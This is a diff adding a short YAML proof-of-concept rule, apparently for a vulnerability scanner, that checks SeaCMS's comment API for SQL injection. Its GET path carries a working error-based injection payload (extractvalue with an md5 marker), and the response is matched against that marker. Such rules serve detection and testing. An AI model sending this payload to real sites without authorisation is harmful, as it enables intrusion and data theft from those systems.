@@ -1,0 +1,11 @@
+name: poc-yaml-seacms-sqli
+rules:
+  - method: GET
+    path: /comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5(202072102)))),@`%27`
+    follow_redirects: true
+    expression: >
+      response.status == 200 && response.body.bcontains(b"6f7c6dcbc380aac3bcba1f9fccec99")
+detail:
+  author: MaxSecurity(https://github.com/MaxSecurity)
+  links:
+    - https://www.uedbox.com/post/54561/
